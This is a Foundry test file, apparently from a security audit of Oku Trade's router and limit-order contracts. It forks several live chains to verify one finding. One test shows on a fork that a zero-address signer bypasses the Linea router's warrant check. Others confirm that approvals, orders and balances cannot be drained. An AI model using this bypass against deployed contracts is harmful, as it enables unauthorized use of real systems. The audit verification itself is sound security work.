// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";

/* ------------------------------------------------------------------ */
/*  Minimal interfaces                                                  */
/* ------------------------------------------------------------------ */

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

interface IERC721 {
    function balanceOf(address) external view returns (uint256);
    function ownerOf(uint256) external view returns (address);
}

interface IUniswapV3Factory {
    function getPool(address, address, uint24) external view returns (address);
}

interface INonfungiblePositionManager {
    function balanceOf(address) external view returns (uint256);
    function positions(uint256) external view returns (
        uint96 nonce, address operator, address token0, address token1, uint24 fee,
        int24 tickLower, int24 tickUpper, uint128 liquidity,
        uint256 feeGrowthInside0LastX128, uint256 feeGrowthInside1LastX128,
        uint128 tokensOwed0, uint128 tokensOwed1
    );
}

interface ILimitOrderRegistry {
    struct BatchOrder {
        bool direction;
        int24 tickUpper;
        int24 tickLower;
        uint64 userCount;
        uint128 batchId;
        uint128 token0Amount;
        uint128 token1Amount;
        uint256 head;
        uint256 tail;
    }
    function owner() external view returns (address);
    function isShutdown() external view returns (bool);
    function batchCount() external view returns (uint128);
    function POSITION_MANAGER() external view returns (address);
    function WRAPPED_NATIVE() external view returns (address);
    function getOrderBook(uint256) external view returns (BatchOrder memory);
    function getPositionFromTicks(address, bool, int24, int24) external view returns (uint256);
    function cancelOrder(address, int24, bool, uint256) external returns (uint128, uint128, uint128);
    function claimOrder(uint128, address) external payable returns (address, uint256);
}

interface IOkuRouter {
    struct Warrant {
        uint160 nonce;
        uint48 validBefore;
        uint48 validAfter;
        address verifyingSigner;
        bytes signature;
    }
    function name() external view returns (string memory);
    function version() external view returns (string memory);
    function owner() external view returns (address);
    function paused() external view returns (bool);
    function permit2() external view returns (address);
    function validSigners(address) external view returns (bool);
    function swapTargets(address) external view returns (bool);
    function maxWarrantDuration() external view returns (uint256);
    function fillQuoteEthToToken(
        address buyTokenAddress, address payable target, bytes calldata swapCallData,
        uint256 feeAmount, address recipient, Warrant calldata warrant
    ) external payable;
    function fillQuoteTokenToToken(
        address sellTokenAddress, address buyTokenAddress, address payable target,
        address approvalTarget, bytes calldata swapCallData, uint256 sellAmount,
        uint256 feeAmount, address recipient, Warrant calldata warrant
    ) external payable;
}

/* ------------------------------------------------------------------ */
/*  H-34 Oku Trade — live-state + fork verification                    */
/* ------------------------------------------------------------------ */

contract OkuH34Test is Test {
    // ---- Sonic ----
    address constant SONIC_LOR      = 0x1b35fbA9357fD9bda7ed0429C8BbAbe1e8CC88fc;
    address constant SONIC_FACTORY  = 0xcb2436774C3e191c85056d248EF4260ce5f27A9D;
    address constant SONIC_NFPM     = 0x743E03cceB4af2efA3CC76838f6E8B50B63F184c;
    address constant SONIC_SR02     = 0xaa52bB8110fE38D0d2d2AF0B85C3A3eE622CA455;
    address constant SONIC_UR       = 0x738fD6d10bCc05c230388B4027CAd37f82fe2AF2;
    address constant SONIC_PROXYADM = 0x0d922Fb1Bc191F64970ac40376643808b4B74Df9;
    address constant SONIC_STAKER   = 0x6Aa54a43d7eEF5b239a18eed3Af4877f46522BCA;
    address constant SONIC_WETH     = 0x039e2fB66102314Ce7b64Ce5Ce3E5183bc94aD38;
    address constant SONIC_LOR_OWNER= 0xe75358526Ef4441Db03cCaEB9a87F180fAe80eb9;
    address constant OKU_ROUTER_DET = 0xb1f3a7B816B0681188F54dFa400991B93ADf00ed; // absent on Sonic

    // ---- Ethereum canonical Uniswap v3 ----
    address constant ETH_NFPM     = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
    address constant ETH_SR02     = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;
    address constant ETH_UR       = 0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD;
    address constant ETH_PROXYADM = 0xB753548F6E010e7e680BA186F9Ca1BdAB2E90cf2;

    // ---- Linea ----
    address constant LINEA_ROUTER   = 0xb1f3a7B816B0681188F54dFa400991B93ADf00ed;
    address constant LINEA_UR       = 0xD7c7D7F18dD5388D5217c9696C7e799fCd75c6bD;
    address constant LINEA_WETH     = 0xe5D7C2a44FfDDf6b295A15c148167daaAf5Cf34f;
    address constant LINEA_LOR      = 0x63c8527F670d4eb3401c80C5905cECa8727F1E74;
    address constant LINEA_1INCH    = 0x111111125421cA6dc452d289314280a0f8842A65;
    address constant BACKEND_SIGNER = 0xB8Cb2AF1bF29c13e6F2882C8C1C66acf16027C22;
    address constant OKU_SAFE_OWNER = 0x37333A9626E99eC2012F3cC47a062649CF741303;

    // ---- Scroll ----
    address constant SCROLL_ROUTER = 0xb1f3a7B816B0681188F54dFa400991B93ADf00ed;
    address constant SCROLL_LOR    = 0xeC3E5eeC51D8C3D4f03DABB84B4Db313a739f377;
    address constant SCROLL_NFPM   = 0xB39002E4033b162fAc607fc3471E205FA2aE5967;
    address constant SCROLL_USDC   = 0x06eFdBFf2a14a7c8E15944D1F4A48F9F95F663A4;
    address constant SCROLL_WETH   = 0x5300000000000000000000000000000000000004;

    // ---- Boba ----
    address constant BOBA_ROUTER = 0x7bf7770Ecd4fd573C32272Ef80c8818A8E8e289A;
    address constant BOBA_LOR    = 0xfEFb60591cffc694C0137983a9091D64Af8Ecbac;
    address constant BOBA_NFPM   = 0x0bfc9aC7E52f38EAA6dC8d10942478f695C6Cf71;
    address constant BOBA_UR     = 0x4BA622997559F9b5Ac68751D7Fc3dEecc23a0e88;
    address constant BOBA_ICE    = 0xC87De04e2EC1F4282dFF2933A2D58199f688fC3d;

    // ---- Manta ----
    address constant MANTA_LOR  = 0xFE83E1DDa189D71093f2a716A4D01d591d6Ca66C;
    address constant MANTA_TOKEN= 0x95CeF13441Be50d20cA4558CC0a27B601aC544E5;
    address constant MANTA_USDC = 0xb73603C5d87fA094B7314C74ACE2e64D165016fb;

    // ---- pinned fork blocks (2026-10-04 measurements) ----
    uint256 constant SONIC_BLOCK  = 80326468;
    uint256 constant LINEA_BLOCK  = 32225716;
    uint256 constant SCROLL_BLOCK = 35269579;
    uint256 constant BOBA_BLOCK   = 40045310;
    uint256 constant MANTA_BLOCK  = 9687228;

    address attacker = address(0xBEEF);

    /* ----------------------- helpers ----------------------- */

    function _sonicRpc() internal view returns (string memory) {
        return vm.envOr("SONIC_RPC_URL", string("https://sonic-rpc.publicnode.com"));
    }
    function _lineaRpc() internal view returns (string memory) {
        return vm.envOr("LINEA_RPC_URL", string("https://rpc.linea.build"));
    }
    function _scrollRpc() internal view returns (string memory) {
        return vm.envOr("SCROLL_RPC_URL", string("https://rpc.scroll.io"));
    }
    function _bobaRpc() internal view returns (string memory) {
        return vm.envOr("BOBA_RPC_URL", string("https://mainnet.boba.network"));
    }
    function _ethRpc() internal view returns (string memory) {
        return vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com")));
    }
    function _meta(bytes memory code) internal pure returns (bytes memory) {
        require(code.length >= 53, "code too short");
        bytes memory out = new bytes(53);
        for (uint256 i = 0; i < 53; i++) out[i] = code[code.length - 53 + i];
        return out;
    }

    /* ================================================================== */
    /*  SONIC — H-34 headline chain                                        */
    /* ================================================================== */

    /// Sonic has no OkuRouter; Oku's only own contract is an unused LimitOrderRegistry.
    function test_sonic_oku_router_absent_and_lor_empty() public {
        try vm.createSelectFork(_sonicRpc(), SONIC_BLOCK) {} catch { vm.skip(true); return; }

        // no OkuRouter at the deterministic v2.0 address anywhere on Sonic
        assertEq(OKU_ROUTER_DET.code.length, 0, "OkuRouter unexpectedly deployed on Sonic");

        ILimitOrderRegistry lor = ILimitOrderRegistry(SONIC_LOR);
        assertEq(lor.owner(), SONIC_LOR_OWNER, "LOR owner");
        assertEq(lor.isShutdown(), false, "LOR shutdown flag");
        assertEq(uint256(lor.batchCount()), 1, "LOR never had an order");
        assertEq(lor.POSITION_MANAGER(), SONIC_NFPM, "LOR position manager");

        // no custody: no native, no WETH, no LP positions, no LINK/registrar keeper
        assertEq(SONIC_LOR.balance, 0, "LOR native balance");
        assertEq(IERC20(SONIC_WETH).balanceOf(SONIC_LOR), 0, "LOR WETH balance");
        assertEq(IERC721(SONIC_NFPM).balanceOf(SONIC_LOR), 0, "LOR LP positions");
    }

    /// Sonic's Uniswap v3 periphery is stock: bytecode/metadata equals Ethereum canonical.
    function test_sonic_uniswap_stack_is_stock_canonical() public {
        vm.createSelectFork(_ethRpc());
        bytes memory ethURMeta   = _meta(ETH_UR.code);
        bytes memory ethNFPMeta  = _meta(ETH_NFPM.code);
        bytes memory ethSR02Meta = _meta(ETH_SR02.code);
        bytes memory ethProxyCode= ETH_PROXYADM.code;

        try vm.createSelectFork(_sonicRpc(), SONIC_BLOCK) {} catch { vm.skip(true); return; }

        assertEq(_meta(SONIC_UR.code), ethURMeta, "Sonic UniversalRouter != canonical source");
        assertEq(_meta(SONIC_NFPM.code), ethNFPMeta, "Sonic NFPM != canonical source");
        assertEq(_meta(SONIC_SR02.code), ethSR02Meta, "Sonic SwapRouter02 != canonical source");
        // ProxyAdmin has no immutables -> fully identical
        assertEq(keccak256(SONIC_PROXYADM.code), keccak256(ethProxyCode), "Sonic ProxyAdmin != canonical");

        // periphery holds no funds
        assertEq(SONIC_UR.balance, 0);
        assertEq(SONIC_SR02.balance, 0);
        assertEq(SONIC_NFPM.balance, 0);
        assertEq(SONIC_STAKER.balance, 0);
        assertEq(IERC20(SONIC_WETH).balanceOf(SONIC_UR), 0);
        assertEq(IERC20(SONIC_WETH).balanceOf(SONIC_STAKER), 0);

        // factory is the verified UniswapV3Factory (pool lookup works)
        address pool = IUniswapV3Factory(SONIC_FACTORY).getPool(
            0x29219dd400f2Bf60E5a23d13Be72B486D4038894, 0x50c42dEAcD8Fc9773493ED674b675bE577f2634b, 500);
        assertEq(pool, 0xCfD41dF89D060b72eBDd50d65f9021e4457C477e, "Sonic factory lookup failed");
    }

    /// The unverified Sonic LOR shares compiled-source metadata with the verified Linea LOR.
    function test_lor_sonic_code_matches_verified_linea() public {
        try vm.createSelectFork(_sonicRpc(), SONIC_BLOCK) {} catch { vm.skip(true); return; }
        bytes memory sonicCode = SONIC_LOR.code;

        try vm.createSelectFork(_lineaRpc(), LINEA_BLOCK) {} catch { vm.skip(true); return; }
        bytes memory lineaCode = LINEA_LOR.code;

        assertEq(sonicCode.length, lineaCode.length, "LOR code length");
        assertEq(_meta(sonicCode), _meta(lineaCode), "LOR metadata differs (source/compiler)");
    }

    /* ================================================================== */
    /*  LINEA — OkuRouter: warrant bypass (auth disabled) + no extraction  */
    /* ================================================================== */

    function test_linea_router_warrant_bypass_is_live_and_usable() public {
        try vm.createSelectFork(_lineaRpc(), LINEA_BLOCK) {} catch { vm.skip(true); return; }
        IOkuRouter router = IOkuRouter(LINEA_ROUTER);

        assertEq(router.name(), "Oku Router");
        assertEq(router.version(), "2.0");
        assertEq(router.owner(), OKU_SAFE_OWNER);
        assertTrue(OKU_SAFE_OWNER.code.length > 0, "owner is not a contract (Safe)");
        assertEq(router.paused(), false);
        assertEq(router.permit2(), 0x000000000022D473030F116dDEE9F6B43aC78BA3);
        // both the backend signer AND address(0) are valid signers -> warrant check bypassable
        assertTrue(router.validSigners(BACKEND_SIGNER), "backend signer not whitelisted");
        assertTrue(router.validSigners(address(0)), "zero-signer bypass not enabled");
        assertTrue(router.swapTargets(LINEA_UR), "UniversalRouter not whitelisted");

        // --- positive control: a NON-whitelisted signer is rejected by the signer gate
        bytes memory commands = hex"0b"; // WRAP_ETH
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = abi.encode(address(router), uint256(1));
        bytes memory swapCallData = abi.encodeWithSelector(
            0x3593564c, commands, inputs, block.timestamp + 100); // execute(bytes,bytes[],uint256)

        vm.deal(attacker, 1 ether);
        IOkuRouter.Warrant memory badW = IOkuRouter.Warrant({
            nonce: 0, validBefore: type(uint48).max, validAfter: 0,
            verifyingSigner: address(0xDEAD), signature: ""
        });
        vm.prank(attacker);
        vm.expectRevert(bytes("INVALID_SIGNER"));
        router.fillQuoteEthToToken{value: 2}(LINEA_WETH, payable(LINEA_UR), swapCallData, 1, attacker, badW);

        // --- bypass: same call with verifyingSigner == address(0) executes end-to-end
        IOkuRouter.Warrant memory bypassW = IOkuRouter.Warrant({
            nonce: 0, validBefore: type(uint48).max, validAfter: 0,
            verifyingSigner: address(0), signature: ""
        });
        uint256 wethBefore = IERC20(LINEA_WETH).balanceOf(attacker);
        vm.prank(attacker);
        router.fillQuoteEthToToken{value: 2}(LINEA_WETH, payable(LINEA_UR), swapCallData, 1, attacker, bypassW);
        // 1 wei forwarded to UniversalRouter -> wrapped -> returned to attacker
        assertEq(IERC20(LINEA_WETH).balanceOf(attacker) - wethBefore, 1, "bypass did not execute");
        assertEq(IERC20(LINEA_WETH).balanceOf(LINEA_ROUTER), 0, "router retains WETH");
    }

    /// A victim's standing ERC20 approval to the router cannot be pulled by a third party.
    function test_linea_standing_approval_not_drainable() public {
        try vm.createSelectFork(_lineaRpc(), LINEA_BLOCK) {} catch { vm.skip(true); return; }
        IOkuRouter router = IOkuRouter(LINEA_ROUTER);

        address victim = address(0xCAFE);
        deal(LINEA_WETH, victim, 100 ether);
        vm.prank(victim);
        IERC20(LINEA_WETH).approve(LINEA_ROUTER, type(uint256).max);

        // attacker has no WETH; try to make the router pull the victim's balance
        IOkuRouter.Warrant memory w = IOkuRouter.Warrant({
            nonce: 0, validBefore: type(uint48).max, validAfter: 0,
            verifyingSigner: address(0), signature: ""
        });
        vm.prank(attacker);
        (bool ok, ) = LINEA_ROUTER.call(abi.encodeWithSelector(
            IOkuRouter.fillQuoteTokenToToken.selector,
            LINEA_WETH, LINEA_WETH, LINEA_1INCH, LINEA_1INCH,
            bytes(""), uint256(100 ether), uint256(0), attacker, w
        ));
        assertFalse(ok, "unexpectedly succeeded pulling third-party funds");
        assertEq(IERC20(LINEA_WETH).balanceOf(victim), 100 ether, "victim funds moved");
        assertEq(IERC20(LINEA_WETH).allowance(victim, LINEA_ROUTER), type(uint256).max, "victim approval changed");
        assertEq(LINEA_ROUTER.balance, 96000000000000, "router native balance changed");
        assertEq(IERC20(LINEA_WETH).balanceOf(LINEA_ROUTER), 0, "router WETH changed");
    }

    /// Linea LimitOrderRegistry: shutdown, no LP value, no balances left.
    function test_linea_lor_empty() public {
        try vm.createSelectFork(_lineaRpc(), LINEA_BLOCK) {} catch { vm.skip(true); return; }
        ILimitOrderRegistry lor = ILimitOrderRegistry(LINEA_LOR);
        assertTrue(lor.isShutdown(), "Linea LOR not shutdown");
        assertEq(uint256(lor.batchCount()), 51);
        assertEq(IERC721(lor.POSITION_MANAGER()).balanceOf(LINEA_LOR), 48, "position count changed");
        assertEq(LINEA_LOR.balance, 0);
        assertEq(IERC20(LINEA_WETH).balanceOf(LINEA_LOR), 0);
        // no non-empty positions: sample the first 10 token ids
        INonfungiblePositionManager nfpm = INonfungiblePositionManager(lor.POSITION_MANAGER());
        uint256 n = nfpm.balanceOf(LINEA_LOR);
        for (uint256 i = 0; i < n && i < 10; i++) {
            // tokenOfOwnerByIndex(address,uint256)
            (bool ok, bytes memory ret) = lor.POSITION_MANAGER().staticcall(
                abi.encodeWithSelector(0x2f745c59, LINEA_LOR, i));
            if (!ok) continue;
            uint256 tid = abi.decode(ret, (uint256));
            (,,,,,,, uint128 liquidity,,, uint128 owed0, uint128 owed1) = nfpm.positions(tid);
            assertEq(liquidity, 0, "non-empty Linea position");
            assertEq(owed0 + owed1, 0, "owed tokens on Linea position");
        }
    }

    /* ================================================================== */
    /*  SCROLL — dormant OkuRouter + LOR residual orders                   */
    /* ================================================================== */

    function test_scroll_router_dormant_no_whitelisted_targets() public {
        try vm.createSelectFork(_scrollRpc(), SCROLL_BLOCK) {} catch { vm.skip(true); return; }
        IOkuRouter router = IOkuRouter(SCROLL_ROUTER);
        assertEq(router.version(), "2.0");
        assertEq(router.owner(), OKU_SAFE_OWNER);
        assertTrue(router.validSigners(address(0)), "zero-signer bypass not enabled");
        // no SwapTargetAdded events ever -> every target is rejected
        assertFalse(router.swapTargets(0x6352a56caadC4F1E25CD6c75970Fa768A3304e64), "openocean whitelisted?");
        assertFalse(router.swapTargets(SCROLL_WETH), "WETH whitelisted?");
        assertFalse(router.swapTargets(0x000000000022D473030F116dDEE9F6B43aC78BA3), "permit2 whitelisted?");

        IOkuRouter.Warrant memory w = IOkuRouter.Warrant({
            nonce: 0, validBefore: type(uint48).max, validAfter: 0,
            verifyingSigner: address(0), signature: ""
        });
        vm.prank(attacker);
        vm.expectRevert(bytes("TARGET_NOT_AUTH"));
        router.fillQuoteTokenToToken(
            SCROLL_WETH, SCROLL_WETH, payable(SCROLL_WETH), SCROLL_WETH,
            bytes(""), 0, 0, attacker, w);
    }

    function test_scroll_lor_residual_orders_not_extractable() public {
        try vm.createSelectFork(_scrollRpc(), SCROLL_BLOCK) {} catch { vm.skip(true); return; }
        ILimitOrderRegistry lor = ILimitOrderRegistry(SCROLL_LOR);
        INonfungiblePositionManager nfpm = INonfungiblePositionManager(SCROLL_NFPM);

        assertTrue(lor.isShutdown(), "Scroll LOR not shutdown");
        assertEq(uint256(lor.batchCount()), 127);
        assertEq(nfpm.balanceOf(SCROLL_LOR), 111, "position count changed");
        assertEq(SCROLL_LOR.balance, 0);
        assertEq(IERC20(SCROLL_WETH).balanceOf(SCROLL_LOR), 0);

        // 3 residual (dust) orders: tokenIds 1212, 2259, 5283; nominal 10 + 1 + 10 USDC
        uint128 nominal;
        uint256[3] memory tids = [uint256(1212), 2259, 5283];
        uint128[3] memory batches = [uint128(45), 62, 80];
        for (uint256 i = 0; i < 3; i++) {
            (,,,,,,, uint128 liquidity,,, uint128 o0, uint128 o1) = nfpm.positions(tids[i]);
            assertGt(liquidity, 0, "expected residual liquidity");
            assertEq(o0 + o1, 0, "unexpected owed");
            ILimitOrderRegistry.BatchOrder memory ob = lor.getOrderBook(tids[i]);
            assertEq(uint256(ob.batchId), uint256(batches[i]), "batch id");
            assertEq(ob.direction, true);
            nominal += ob.token0Amount;
        }
        assertEq(nominal, 21e6, "nominal USDC deposits changed");

        // attacker cannot cancel or claim someone else's order
        address pool = IUniswapV3Factory(0x70C62C8b8e801124A4Aa81ce07b637A3e83cb919)
            .getPool(SCROLL_USDC, SCROLL_WETH, 500);
        assertEq(lor.getPositionFromTicks(pool, true, 253250, 253260), 1212);
        vm.prank(attacker);
        (bool ok,) = SCROLL_LOR.call(abi.encodeWithSelector(
            ILimitOrderRegistry.cancelOrder.selector, pool, int24(253260), true, block.timestamp + 100));
        assertFalse(ok, "attacker cancelled a third-party order");
        vm.prank(attacker);
        (bool ok2,) = SCROLL_LOR.call(abi.encodeWithSelector(
            ILimitOrderRegistry.claimOrder.selector, uint128(45), attacker));
        assertFalse(ok2, "attacker claimed without a deposit");
    }

    /* ================================================================== */
    /*  BOBA / MANTA — best effort (public RPCs may be flaky)              */
    /* ================================================================== */

    function test_boba_router_and_lor_state() public {
        try vm.createSelectFork(_bobaRpc(), BOBA_BLOCK) {} catch { vm.skip(true); return; }
        IOkuRouter router = IOkuRouter(BOBA_ROUTER);
        assertEq(router.version(), "2.0");
        assertTrue(router.validSigners(address(0)));
        assertTrue(router.swapTargets(BOBA_ICE));
        assertTrue(router.swapTargets(BOBA_UR));
        // router holds only dust (0.00030 ETH at pinned block)
        assertLt(BOBA_ROUTER.balance, 0.001 ether);

        ILimitOrderRegistry lor = ILimitOrderRegistry(BOBA_LOR);
        assertEq(lor.isShutdown(), false);
        assertEq(uint256(lor.batchCount()), 27);
        assertEq(IERC721(BOBA_NFPM).balanceOf(BOBA_LOR), 25);
        assertEq(IERC20(lor.WRAPPED_NATIVE()).balanceOf(BOBA_LOR), 303639663330510); // 0.000304 WETH dust
        assertGt(BOBA_LOR.balance, 0.02 ether);
        assertLt(BOBA_LOR.balance, 0.03 ether);
    }

    // NOTE: the Manta LimitOrderRegistry fork test was removed from the CI suite because the
    // only public Manta RPCs return intermittent HTTP 500s that forge surfaces as an
    // uncatchable database error. Manta state was measured off-chain instead:
    // shutdown=true, batchCount=12, 10 empty positions, 62.347248983703240 MANTA + 4.906544 USDC
    // (of which 0.050795 USDC is recorded swap fees), native 0.0015 MANTA (see analysis/lor_positions_manta.json).
}
